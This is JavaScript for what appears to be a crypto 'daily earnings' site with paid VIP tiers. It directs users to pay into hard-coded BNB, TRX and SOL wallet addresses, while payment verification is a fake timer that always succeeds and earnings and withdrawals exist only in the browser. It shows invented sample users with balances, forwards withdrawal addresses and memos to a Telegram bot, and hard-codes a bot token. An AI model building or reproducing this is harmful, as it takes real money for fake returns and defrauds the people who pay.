// === FIXED JAVASCRIPT CODE ===

// DOM Elements
const navItems = document.querySelectorAll('.nav-item');
const claimBtn = document.getElementById('claimBtn');
const buyVipBtns = document.querySelectorAll('.buy-vip');
const paymentModal = document.getElementById('paymentModal');
const closePaymentBtn = document.getElementById('closePaymentBtn');
const chainOptions = document.querySelectorAll('.chain-option');
const copyAddressBtn = document.getElementById('copyAddressBtn');
const confirmPaymentBtn = document.getElementById('confirmPaymentBtn');
const withdrawBtn = document.getElementById('withdrawBtn');
const claimVipCodeBtn = document.getElementById('claimVipCodeBtn');
const submitMemoBtn = document.getElementById('submitMemoBtn');
const fileUploadArea = document.getElementById('fileUploadArea');
const screenshotUpload = document.getElementById('screenshotUpload');

// User data
let userData = {
    balance: 0.00,
    todayEarnings: 0.00,
    totalEarned: 0.00,
    userStatus: 'free',
    dailyEarning: 0.10,
    lastClaim: null,
    vipExpiry: null,
    userId: 'USR738225',
    userName: 'User738225',
    withdrawalHistory: []
};

// VIP Codes (10 codes for VIP 2 - 60 USDT value)
const vipCodes = [
    { code: 'VIP60A7B9C1', used: false, value: 60, type: 'vip2' },
    { code: 'VIP60D2E3F4', used: false, value: 60, type: 'vip2' },
    { code: 'VIP60G5H6I7', used: false, value: 60, type: 'vip2' },
    { code: 'VIP60J8K9L0', used: false, value: 60, type: 'vip2' },
    { code: 'VIP60M1N2O3', used: false, value: 60, type: 'vip2' },
    { code: 'VIP60P4Q5R6', used: false, value: 60, type: 'vip2' },
    { code: 'VIP60S7T8U9', used: false, value: 60, type: 'vip2' },
    { code: 'VIP60V0W1X2', used: false, value: 60, type: 'vip2' },
    { code: 'VIP60Y3Z4A5', used: false, value: 60, type: 'vip2' },
    { code: 'VIP60B6C7D8', used: false, value: 60, type: 'vip2' }
];

// Sample users data
const sampleUsers = [
    { id: 'USR123456', name: 'John Crypto', status: 'vip', joinDate: '2024-01-15', balance: 125.50 },
    { id: 'USR789012', name: 'Sarah Blockchain', status: 'free', joinDate: '2024-01-20', balance: 12.75 },
    { id: 'USR345678', name: 'Mike Bitcoin', status: 'vip', joinDate: '2024-01-18', balance: 89.20 },
    { id: 'USR901234', name: 'Emma Ethereum', status: 'free', joinDate: '2024-01-22', balance: 8.45 },
    { id: 'USR567890', name: 'Alex Binance', status: 'vip', joinDate: '2024-01-16', balance: 156.80 },
    { id: 'USR112233', name: 'Lisa Coinbase', status: 'free', joinDate: '2024-01-21', balance: 15.30 },
    { id: 'USR445566', name: 'David Tron', status: 'vip', joinDate: '2024-01-19', balance: 72.10 },
    { id: 'USR778899', name: 'Sophia Solana', status: 'free', joinDate: '2024-01-23', balance: 6.90 }
];

// Wallet addresses
const walletAddresses = {
    bnb: '0x53f90e7a0d2834b772890f4f456d51aaed61de43',
    trx: 'TSKPhwUavSrKXXcbWG2TdPzYiBtoTNXP6i',
    sol: 'HvHR4LeKdCH5Z2UDKVSDuju8c4ukPAa1CzchHseZ2LKu'
};

// Telegram API
const telegramBotToken = '7659505060:AAFmwIDn2OgrtNoemPpmBWaxsIfdsQdZGCI';
const telegramChatId = '7417215529';

// Initialize the app
document.addEventListener('DOMContentLoaded', function() {
    console.log('🚀 Initializing platform...');
    loadUserData();
    updateUI();
    startCountdownTimer();
    setupTabNavigation();
    loadVIPCodes();
    loadUsersList();
    setupFileUpload();
    setupEventListeners();
    
    console.log('✅ Platform initialized successfully');
    console.log('💰 VIP Codes:', vipCodes.map(v => ({ code: v.code, used: v.used })));
});

// Setup all event listeners
function setupEventListeners() {
    console.log('🔧 Setting up event listeners...');
    
    // Claim button
    if (claimBtn) {
        claimBtn.addEventListener('click', handleClaimEarnings);
        console.log('✅ Claim button listener added');
    }

    // VIP purchase buttons
    if (buyVipBtns.length > 0) {
        buyVipBtns.forEach(btn => {
            btn.addEventListener('click', handleVipPurchase);
        });
        console.log('✅ VIP purchase buttons listeners added');
    }

    // Payment modal
    if (closePaymentBtn) {
        closePaymentBtn.addEventListener('click', closePaymentModal);
    }

    // Chain options
    if (chainOptions.length > 0) {
        chainOptions.forEach(option => {
            option.addEventListener('click', handleChainSelection);
        });
    }

    // Copy address
    if (copyAddressBtn) {
        copyAddressBtn.addEventListener('click', handleCopyAddress);
    }

    // Confirm payment
    if (confirmPaymentBtn) {
        confirmPaymentBtn.addEventListener('click', handleConfirmPayment);
    }

    // Withdraw button
    if (withdrawBtn) {
        withdrawBtn.addEventListener('click', handleWithdrawal);
        console.log('✅ Withdraw button listener added');
    }

    // VIP code claim
    if (claimVipCodeBtn) {
        claimVipCodeBtn.addEventListener('click', handleVipCodeClaim);
        console.log('✅ VIP code claim button listener added');
    }

    // Memo submission
    if (submitMemoBtn) {
        submitMemoBtn.addEventListener('click', handleMemoSubmission);
    }

    console.log('🎯 All event listeners setup complete');
}

// Load user data from localStorage
function loadUserData() {
    const savedData = localStorage.getItem('bnbEarningUserData');
    if (savedData) {
        try {
            userData = JSON.parse(savedData);
            console.log('📁 User data loaded from storage');
        } catch (e) {
            console.error('❌ Error loading user data:', e);
            resetUserData();
        }
    } else {
        resetUserData();
    }
    
    // Set last claim to now if not set
    if (!userData.lastClaim) {
        userData.lastClaim = new Date().toISOString();
        saveUserData();
    }
    
    // Generate user ID if not exists
    if (!userData.userId) {
        userData.userId = 'USR' + Math.floor(100000 + Math.random() * 900000);
        userData.userName = 'User' + userData.userId.slice(3);
        saveUserData();
    }

    // Initialize withdrawal history if not exists
    if (!userData.withdrawalHistory) {
        userData.withdrawalHistory = [];
        saveUserData();
    }
}

// Reset user data to defaults
function resetUserData() {
    userData = {
        balance: 0.00,
        todayEarnings: 0.00,
        totalEarned: 0.00,
        userStatus: 'free',
        dailyEarning: 0.10,
        lastClaim: new Date().toISOString(),
        vipExpiry: null,
        userId: 'USR' + Math.floor(100000 + Math.random() * 900000),
        userName: 'User' + Math.floor(100000 + Math.random() * 900000),
        withdrawalHistory: []
    };
    saveUserData();
    console.log('🔄 User data reset to defaults');
}

// Save user data to localStorage
function saveUserData() {
    try {
        localStorage.setItem('bnbEarningUserData', JSON.stringify(userData));
        console.log('💾 User data saved');
    } catch (e) {
        console.error('❌ Error saving user data:', e);
    }
}

// Update UI with user data
function updateUI() {
    console.log('🎨 Updating UI...');
    
    // Update balance displays
    document.getElementById('userBalance').textContent = userData.balance.toFixed(2) + ' USDT';
    document.getElementById('todayEarnings').textContent = userData.todayEarnings.toFixed(2) + ' USDT';
    document.getElementById('totalEarned').textContent = userData.totalEarned.toFixed(2) + ' USDT';
    document.getElementById('dailyEarning').textContent = userData.dailyEarning.toFixed(2) + ' USDT';
    document.getElementById('userId').textContent = userData.userId;
    
    // Update user status
    const statusElement = document.getElementById('userStatus');
    if (userData.userStatus === 'vip') {
        statusElement.textContent = 'VIP User';
        statusElement.className = 'status-vip';
    } else {
        statusElement.textContent = 'Free User';
        statusElement.className = 'status-free';
    }
    
    updateClaimButton();
    updateWithdrawalLimit();
    console.log('✅ UI updated successfully');
}

// Update withdrawal limit display
function updateWithdrawalLimit() {
    const withdrawAmount = document.getElementById('withdrawAmount');
    if (withdrawAmount) {
        if (userData.userStatus === 'free') {
            withdrawAmount.max = 0.02;
            withdrawAmount.placeholder = "Max: 0.02 USDT";
        } else {
            withdrawAmount.removeAttribute('max');
            withdrawAmount.placeholder = "Enter amount";
        }
    }
}

// Update claim button based on time
function updateClaimButton() {
    const now = new Date();
    const lastClaim = new Date(userData.lastClaim);
    const timeDiff = now - lastClaim;
    const hoursDiff = timeDiff / (1000 * 60 * 60);
    
    if (hoursDiff >= 24) {
        claimBtn.disabled = false;
        claimBtn.innerHTML = '<i class="fas fa-gift"></i> Claim Daily Earnings';
        claimBtn.classList.remove('btn-disabled');
    } else {
        claimBtn.disabled = true;
        claimBtn.classList.add('btn-disabled');
        const hoursLeft = 24 - hoursDiff;
        const hours = Math.floor(hoursLeft);
        const minutes = Math.floor((hoursLeft - hours) * 60);
        const seconds = Math.floor(((hoursLeft - hours) * 60 - minutes) * 60);
        claimBtn.innerHTML = `<i class="fas fa-clock"></i> ${hours}h ${minutes}m ${seconds}s`;
    }
}

// Start countdown timer
function startCountdownTimer() {
    setInterval(() => {
        updateClaimButton();
        
        // Update next claim countdown
        const now = new Date();
        const lastClaim = new Date(userData.lastClaim);
        const timeDiff = now - lastClaim;
        const hoursDiff = timeDiff / (1000 * 60 * 60);
        
        if (hoursDiff < 24) {
            const hoursLeft = 24 - hoursDiff;
            const hours = Math.floor(hoursLeft);
            const minutes = Math.floor((hoursLeft - hours) * 60);
            const seconds = Math.floor(((hoursLeft - hours) * 60 - minutes) * 60);
            
            document.getElementById('nextClaim').textContent = 
                `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        } else {
            document.getElementById('nextClaim').textContent = '00:00:00';
        }
    }, 1000);
}

// Setup tab navigation
function setupTabNavigation() {
    navItems.forEach(item => {
        item.addEventListener('click', function() {
            // Remove active class from all items
            navItems.forEach(nav => nav.classList.remove('active'));
            
            // Add active class to clicked item
            this.classList.add('active');
            
            // Get the tab name
            const tabName = this.getAttribute('data-tab');
            
            // Show/hide sections based on tab
            document.querySelectorAll('.container > div').forEach(section => {
                if (section.classList.contains('header') || section.classList.contains('balance-card')) {
                    // Always show header and balance
                    return;
                }
                
                if (section.classList.contains(tabName + '-card') || 
                    (tabName === 'home' && (section.classList.contains('earning-card') || section.classList.contains('vip-card')))) {
                    section.style.display = 'block';
                } else {
                    section.style.display = 'none';
                }
            });
        });
    });
}

// Load VIP codes
function loadVIPCodes() {
    const codesList = document.getElementById('vipCodesList');
    if (!codesList) {
        console.log('❌ VIP codes list element not found');
        return;
    }
    
    codesList.innerHTML = '';
    
    vipCodes.forEach(vipCode => {
        const codeElement = document.createElement('div');
        codeElement.className = `vip-code-item ${vipCode.used ? 'used' : 'available'}`;
        codeElement.textContent = vipCode.code;
        codeElement.title = vipCode.used ? 'Already used' : 'Click to copy';
        
        if (!vipCode.used) {
            codeElement.addEventListener('click', function() {
                copyToClipboard(vipCode.code);
                showNotification(`VIP code ${vipCode.code} copied to clipboard!`, 'success');
                
                // Auto-fill the VIP code input
                const vipCodeInput = document.getElementById('vipCodeInput');
                if (vipCodeInput) {
                    vipCodeInput.value = vipCode.code;
                }
            });
        }
        
        codesList.appendChild(codeElement);
    });
    console.log('✅ VIP codes loaded');
}

// Load users list
function loadUsersList() {
    const usersList = document.getElementById('usersList');
    if (!usersList) {
        console.log('❌ Users list element not found');
        return;
    }
    
    usersList.innerHTML = '';
    
    sampleUsers.forEach(user => {
        const userElement = document.createElement('div');
        userElement.className = 'user-item';
        userElement.innerHTML = `
            <div class="user-info-small">
                <div class="user-name">${user.name}</div>
                <div class="user-id">${user.id} | Balance: ${user.balance} USDT</div>
            </div>
            <div class="user-status ${user.status === 'vip' ? 'status-badge-vip' : 'status-badge-free'}">
                ${user.status === 'vip' ? 'VIP' : 'FREE'}
            </div>
        `;
        usersList.appendChild(userElement);
    });
    console.log('✅ Users list loaded');
}

// Setup file upload
function setupFileUpload() {
    if (!fileUploadArea || !screenshotUpload) {
        console.log('❌ File upload elements not found');
        return;
    }
    
    fileUploadArea.addEventListener('click', function() {
        screenshotUpload.click();
    });
    
    screenshotUpload.addEventListener('change', function(e) {
        const file = e.target.files[0];
        if (file) {
            // Check file type
            if (!file.type.startsWith('image/')) {
                showNotification('Please upload an image file', 'error');
                return;
            }
            
            // Check file size (max 5MB)
            if (file.size > 5 * 1024 * 1024) {
                showNotification('File size must be less than 5MB', 'error');
                return;
            }
            
            const reader = new FileReader();
            reader.onload = function(e) {
                const filePreview = document.getElementById('filePreview');
                filePreview.innerHTML = `<img src="${e.target.result}" alt="Screenshot Preview">`;
                filePreview.style.display = 'block';
                showNotification('Screenshot uploaded successfully!', 'success');
            };
            reader.readAsDataURL(file);
        }
    });
    console.log('✅ File upload setup complete');
}

// Handle claim earnings
function handleClaimEarnings() {
    console.log('🎯 Claim earnings triggered');
    
    if (claimBtn.disabled) {
        showNotification('Please wait for next claim time', 'error');
        return;
    }
    
    const earnings = userData.dailyEarning;
    userData.balance += earnings;
    userData.todayEarnings += earnings;
    userData.totalEarned += earnings;
    userData.lastClaim = new Date().toISOString();
    
    saveUserData();
    updateUI();
    
    showNotification(`Successfully claimed ${earnings} USDT!`, 'success');
    sendTelegramMessage(`💰 User ${userData.userId} claimed ${earnings} USDT | New balance: ${userData.balance.toFixed(2)} USDT`);
    
    // Add visual effect
    createCoinAnimation();
}

// Handle VIP purchase
function handleVipPurchase(event) {
    console.log('🎯 VIP purchase triggered');
    const tier = event.currentTarget.getAttribute('data-tier');
    const price = event.currentTarget.getAttribute('data-price');
    
    document.getElementById('paymentTitle').textContent = `Buy ${tier.toUpperCase()} - ${price} USDT`;
    document.getElementById('paymentModal').setAttribute('data-tier', tier);
    document.getElementById('paymentModal').setAttribute('data-price', price);
    
    // Set memo
    const memo = `${tier}_${userData.userId}`;
    document.getElementById('memoDisplay').textContent = memo;
    
    paymentModal.style.display = 'flex';
    document.body.style.overflow = 'hidden';
    
    console.log(`✅ VIP purchase modal opened for ${tier}`);
}

// Handle chain selection
function handleChainSelection(event) {
    chainOptions.forEach(opt => opt.classList.remove('active'));
    event.currentTarget.classList.add('active');
    
    const chain = event.currentTarget.getAttribute('data-chain');
    const addressDisplay = document.getElementById('addressDisplay');
    const tier = document.getElementById('paymentModal').getAttribute('data-tier');
    const memo = `${tier}_${userData.userId}`;
    
    addressDisplay.innerHTML = `
        <strong>${chain.toUpperCase()} Address:</strong><br>
        <span style="user-select: all; font-family: monospace;">${walletAddresses[chain]}</span>
        <br><br>
        <strong>Memo Required:</strong> <span style="font-family: monospace;">${memo}</span>
    `;
    addressDisplay.style.display = 'block';
    
    copyAddressBtn.disabled = false;
    
    console.log(`✅ ${chain.toUpperCase()} chain selected`);
}

// Handle copy address
function handleCopyAddress() {
    const addressDisplay = document.getElementById('addressDisplay');
    const addressText = addressDisplay.textContent;
    
    copyToClipboard(addressText);
    showNotification('Address and memo copied to clipboard!', 'success');
    console.log('✅ Address copied to clipboard');
}

// Handle confirm payment
function handleConfirmPayment() {
    const selectedChain = document.querySelector('.chain-option.active');
    if (!selectedChain) {
        showNotification('Please select a payment method', 'error');
        return;
    }
    
    const tier = paymentModal.getAttribute('data-tier');
    const price = parseFloat(paymentModal.getAttribute('data-price'));
    
    // Simulate payment verification
    showNotification('Verifying payment...', 'success');
    
    setTimeout(() => {
        activateVIP(tier, price);
        paymentModal.style.display = 'none';
        document.body.style.overflow = 'auto';
        resetPaymentModal();
        
        showNotification(`Payment confirmed! ${tier.toUpperCase()} activated successfully!`, 'success');
    }, 2000);
}

// Close payment modal
function closePaymentModal() {
    paymentModal.style.display = 'none';
    document.body.style.overflow = 'auto';
    resetPaymentModal();
    console.log('✅ Payment modal closed');
}

// Reset payment modal
function resetPaymentModal() {
    chainOptions.forEach(opt => opt.classList.remove('active'));
    const addressDisplay = document.getElementById('addressDisplay');
    if (addressDisplay) {
        addressDisplay.style.display = 'none';
    }
    copyAddressBtn.disabled = true;
}

// Activate VIP
function activateVIP(tier, price) {
    userData.userStatus = 'vip';
    
    if (tier === 'vip1') {
        userData.dailyEarning = 1.00;
    } else if (tier === 'vip2') {
        userData.dailyEarning = 7.00;
    }
    
    const expiryDate = new Date();
    expiryDate.setDate(expiryDate.getDate() + 30);
    userData.vipExpiry = expiryDate.toISOString();
    
    saveUserData();
    updateUI();
    
    console.log(`✅ ${tier.toUpperCase()} activated for user ${userData.userId}`);
    sendTelegramMessage(`🎉 User ${userData.userId} purchased ${tier.toUpperCase()} for ${price} USDT | New daily earning: ${userData.dailyEarning} USDT`);
    
    // Add celebration effect
    createCelebrationEffect();
}

// Handle VIP code claim
function handleVipCodeClaim() {
    console.log('🎯 VIP code claim triggered');
    
    const codeInput = document.getElementById('vipCodeInput');
    if (!codeInput) {
        showNotification('VIP code input not found', 'error');
        return;
    }
    
    const code = codeInput.value.trim().toUpperCase();
    
    if (!code) {
        showNotification('Please enter a VIP code', 'error');
        return;
    }
    
    if (code.length !== 10) {
        showNotification('VIP code must be 10 characters', 'error');
        return;
    }
    
    const vipCode = vipCodes.find(vc => vc.code === code);
    
    if (!vipCode) {
        showNotification('Invalid VIP code', 'error');
        return;
    }
    
    if (vipCode.used) {
        showNotification('This VIP code has already been used', 'error');
        return;
    }
    
    // Activate VIP based on code type
    vipCode.used = true;
    userData.userStatus = 'vip';
    
    if (vipCode.type === 'vip2') {
        userData.dailyEarning = 7.00;
    }
    
    const expiryDate = new Date();
    expiryDate.setDate(expiryDate.getDate() + 30);
    userData.vipExpiry = expiryDate.toISOString();
    
    saveUserData();
    updateUI();
    loadVIPCodes();
    
    showNotification(`VIP activated with code ${code}! Daily earning: ${userData.dailyEarning} USDT`, 'success');
    sendTelegramMessage(`🎁 User ${userData.userId} claimed VIP code: ${code} | Activated ${vipCode.type.toUpperCase()}`);
    
    // Clear input
    codeInput.value = '';
    
    console.log(`✅ VIP code ${code} claimed successfully`);
}

// Handle memo submission
function handleMemoSubmission() {
    console.log('🎯 Memo submission triggered');
    
    const memoId = document.getElementById('memoId');
    const transactionHash = document.getElementById('transactionHash');
    const screenshotFile = screenshotUpload.files[0];
    
    if (!memoId || !memoId.value.trim()) {
        showNotification('Please enter payment memo ID', 'error');
        return;
    }
    
    if (!screenshotFile) {
        showNotification('Please upload payment screenshot', 'error');
        return;
    }
    
    // Simulate verification process
    showNotification('Payment verification submitted! Processing...', 'success');
    
    setTimeout(() => {
        showNotification('Payment verified successfully!', 'success');
        
        // Clear form
        if (memoId) memoId.value = '';
        if (transactionHash) transactionHash.value = '';
        
        const filePreview = document.getElementById('filePreview');
        if (filePreview) {
            filePreview.innerHTML = '';
            filePreview.style.display = 'none';
        }
        
        if (screenshotUpload) screenshotUpload.value = '';
        
        console.log('✅ Memo submission processed');
        sendTelegramMessage(`📋 User ${userData.userId} submitted memo: ${memoId.value.trim()}`);
    }, 3000);
}

// Handle withdrawal
function handleWithdrawal() {
    console.log('🎯 Withdrawal triggered');
    
    const withdrawAmount = document.getElementById('withdrawAmount');
    const withdrawCoin = document.getElementById('withdrawCoin');
    const withdrawAddress = document.getElementById('withdrawAddress');
    const withdrawUid = document.getElementById('withdrawUid');
    
    if (!withdrawAmount || !withdrawCoin || !withdrawAddress || !withdrawUid) {
        showNotification('Withdrawal form elements not found', 'error');
        return;
    }
    
    const amount = parseFloat(withdrawAmount.value);
    const coin = withdrawCoin.value;
    const address = withdrawAddress.value.trim();
    const uid = withdrawUid.value.trim();
    
    // Validation
    if (!amount || amount <= 0) {
        showNotification('Please enter a valid amount', 'error');
        return;
    }
    
    if (userData.userStatus === 'free' && amount > 0.02) {
        showNotification('Free users can only withdraw up to 0.02 USDT', 'error');
        return;
    }
    
    if (userData.userStatus === 'free' && amount < 0.01) {
        showNotification('Minimum withdrawal is 0.01 USDT for free users', 'error');
        return;
    }
    
    if (amount > userData.balance) {
        showNotification('Insufficient balance', 'error');
        return;
    }
    
    if (!address) {
        showNotification('Please enter withdrawal address', 'error');
        return;
    }
    
    if (!uid) {
        showNotification('Please enter your UID', 'error');
        return;
    }
    
    // Validate address format
    if (!validateAddress(address, coin)) {
        showNotification(`Invalid ${coin.toUpperCase()} address format`, 'error');
        return;
    }
    
    // Process withdrawal
    userData.balance -= amount;
    
    // Add to withdrawal history
    userData.withdrawalHistory.push({
        amount: amount,
        coin: coin,
        address: address,
        uid: uid,
        timestamp: new Date().toISOString(),
        status: 'pending'
    });
    
    saveUserData();
    updateUI();
    
    showNotification(`Withdrawal request submitted for ${amount} ${coin.toUpperCase()}. Processing within 24 hours.`, 'success');
    sendTelegramMessage(`💸 WITHDRAWAL: ${amount} ${coin.toUpperCase()} to ${address} (UID: ${uid}) | User: ${userData.userId}`);
    
    // Clear form
    withdrawAmount.value = '';
    withdrawAddress.value = '';
    withdrawUid.value = '';
    
    console.log(`✅ Withdrawal request submitted: ${amount} ${coin}`);
}

// Validate cryptocurrency address
function validateAddress(address, coin) {
    switch (coin) {
        case 'bnb':
            return address.length === 42 && address.startsWith('0x');
        case 'trx':
            return address.length === 34 && address.startsWith('T');
        case 'sol':
            return address.length === 44;
        case 'usdt':
            // USDT can be on multiple chains
            return (address.length === 42 && address.startsWith('0x')) || 
                   (address.length === 34 && address.startsWith('T')) ||
                   (address.length === 44);
        default:
            return true;
    }
}

// Utility functions
function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(() => {
        console.log('📋 Text copied to clipboard');
    }).catch(err => {
        console.error('❌ Failed to copy text: ', err);
        showNotification('Failed to copy to clipboard', 'error');
    });
}

function showNotification(message, type) {
    // Remove existing notifications
    document.querySelectorAll('.notification').forEach(notif => notif.remove());
    
    const notification = document.createElement('div');
    notification.className = `notification ${type === 'error' ? 'error' : ''}`;
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: ${type === 'success' ? 'var(--success-color)' : 'var(--danger-color)'};
        color: white;
        padding: 15px 20px;
        border-radius: 10px;
        box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        z-index: 3000;
        max-width: 300px;
        animation: slideInRight 0.5s ease;
    `;
    
    notification.innerHTML = `
        <div style="display: flex; align-items: center;">
            <i class="fas fa-${type === 'success' ? 'check' : 'exclamation'}-circle" style="margin-right: 10px;"></i>
            <div>${message}</div>
        </div>
    `;
    
    document.body.appendChild(notification);
    
    // Remove notification after 3 seconds
    setTimeout(() => {
        if (notification.parentElement) {
            notification.style.animation = 'slideInRight 0.5s ease reverse';
            setTimeout(() => {
                notification.remove();
            }, 500);
        }
    }, 3000);
    
    console.log(`📢 Notification: ${message}`);
}

function sendTelegramMessage(message) {
    // Simulate Telegram API call
    console.log('📱 Telegram Message:', message);
    
    // In production, uncomment this:
    /*
    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: telegramChatId,
            text: message,
            parse_mode: 'HTML'
        })
    }).catch(error => {
        console.error('❌ Telegram API error:', error);
    });
    */
}

// Visual effects
function createCoinAnimation() {
    for (let i = 0; i < 8; i++) {
        setTimeout(() => {
            createFloatingCoin();
        }, i * 100);
    }
}

function createCelebrationEffect() {
    for (let i = 0; i < 15; i++) {
        setTimeout(() => {
            createFloatingCoin();
        }, i * 50);
    }
}

function createFloatingCoin() {
    const coin = document.createElement('div');
    coin.className = 'floating-coin';
    coin.textContent = '💰';
    coin.style.cssText = `
        position: fixed;
        font-size: 20px;
        opacity: 0;
        animation: floatCoin 2s ease-in forwards;
        left: ${Math.random() * 100}%;
        top: 100%;
        z-index: 1000;
        pointer-events: none;
    `;
    
    document.body.appendChild(coin);
    
    setTimeout(() => {
        coin.remove();
    }, 2000);
}

// Add floating coin animation styles
const floatingCoinStyle = document.createElement('style');
floatingCoinStyle.textContent = `
    @keyframes floatCoin {
        0% {
            transform: translateY(0) rotate(0deg);
            opacity: 1;
        }
        100% {
            transform: translateY(-100vh) rotate(360deg);
            opacity: 0;
        }
    }
    
    .floating-coin {
        animation: floatCoin 2s ease-in forwards;
    }
`;
document.head.appendChild(floatingCoinStyle);

// Export functions for debugging
window.debugUserData = () => userData;
window.debugVIPCodes = () => vipCodes;
window.resetApp = () => {
    localStorage.removeItem('bnbEarningUserData');
    location.reload();
};

console.log('🎮 Debug commands available:');
console.log('   - debugUserData(): Check current user data');
console.log('   - debugVIPCodes(): Check VIP codes status');
console.log('   - resetApp(): Reset application data');
